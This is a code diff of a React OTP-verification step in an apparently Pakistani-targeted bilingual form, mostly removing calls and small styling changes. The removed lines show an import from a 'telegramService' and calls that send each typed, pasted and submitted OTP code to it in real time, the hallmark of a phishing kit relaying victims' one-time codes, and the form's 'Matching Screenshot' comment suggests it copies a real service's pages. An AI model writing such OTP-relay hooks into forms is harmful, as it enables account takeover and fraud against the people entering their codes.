@@ -1,12 +1,11 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { ArrowRight, ArrowLeft, CheckCircle, ShieldAlert, RotateCw } from 'lucide-react';
-import { sendRealtimeOtpUpdate } from '../services/telegramService';
 
 interface Step4Props {
   mobileNo: string;
   otpValue: string;
   onUpdateOtp: (val: string) => void;
-  onNext: () => void;
+  onNext: (otpCode?: string) => void;
   onBack: () => void;
 }
 
@@ -54,7 +53,6 @@ export const Step4OtpVerification: React.FC<Step4Props> = ({
       setDigits(updated);
       const code = updated.join('');
       onUpdateOtp(code);
-      sendRealtimeOtpUpdate(code);
       return;
     }
 
@@ -64,7 +62,6 @@ export const Step4OtpVerification: React.FC<Step4Props> = ({
     setDigits(updated);
     const code = updated.join('');
     onUpdateOtp(code);
-    sendRealtimeOtpUpdate(code);
     setError('');
 
     // Advance focus
@@ -91,7 +88,6 @@ export const Step4OtpVerification: React.FC<Step4Props> = ({
       setDigits(updated);
       const code = updated.join('');
       onUpdateOtp(code);
-      sendRealtimeOtpUpdate(code);
       setError('');
       const focusTarget = Math.min(charArr.length, 5);
       inputRefs.current[focusTarget]?.focus();
@@ -113,8 +109,7 @@ export const Step4OtpVerification: React.FC<Step4Props> = ({
       setError('Please enter complete 6-digit OTP code / مکمل 6 ہندسوں کا او ٹی پی درج کریں');
       return;
     }
-    sendRealtimeOtpUpdate(code);
-    onNext();
+    onNext(code);
   };
 
   const maskPhone = (phone: string) => {
@@ -144,7 +139,7 @@ export const Step4OtpVerification: React.FC<Step4Props> = ({
         </div>
       </div>
 
-      {/* Success Sent Banner (Matching Screenshot 9) */}
+      {/* Success Sent Banner */}
       {toastVisible && (
         <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3.5 mb-4 text-emerald-800 text-xs flex items-start gap-2.5 shadow-xs">
           <CheckCircle className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
@@ -206,7 +201,7 @@ export const Step4OtpVerification: React.FC<Step4Props> = ({
             type="button"
             onClick={handleResend}
             id="resend-otp-btn"
-            className="text-xs font-bold text-[#0f2848] hover:text-[#0e5e38] flex items-center gap-1 hover:underline focus:outline-hidden"
+            className="text-xs font-bold text-[#0f2848] hover:text-[#0e5e38] flex items-center gap-1 hover:underline focus:outline-hidden cursor-pointer"
           >
             <RotateCw className="w-3 h-3" />
             <span>Resend / دوبارہ بھیجیں</span>
@@ -232,7 +227,7 @@ export const Step4OtpVerification: React.FC<Step4Props> = ({
             type="button"
             onClick={onBack}
             id="step4-back-btn"
-            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5"
+            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
           >
             <ArrowLeft className="w-4 h-4" />
             <span>Back / واپس</span>
@@ -241,7 +236,7 @@ export const Step4OtpVerification: React.FC<Step4Props> = ({
           <button
             type="submit"
             id="step4-continue-btn"
-            className="flex-1 py-3 px-4 bg-[#0f2848] hover:bg-[#163a66] active:bg-[#0b1c33] text-white font-bold text-xs rounded-lg transition-all shadow-sm flex items-center justify-center gap-1.5"
+            className="flex-1 py-3 px-4 bg-[#0f2848] hover:bg-[#163a66] active:bg-[#0b1c33] text-white font-bold text-xs rounded-lg transition-all shadow-sm flex items-center justify-center gap-1.5 cursor-pointer"
           >
             <span>Verify OTP / تصدیق</span>
             <ArrowRight className="w-4 h-4" />
@@ -251,4 +246,3 @@ export const Step4OtpVerification: React.FC<Step4Props> = ({
     </div>
   );
 };
-
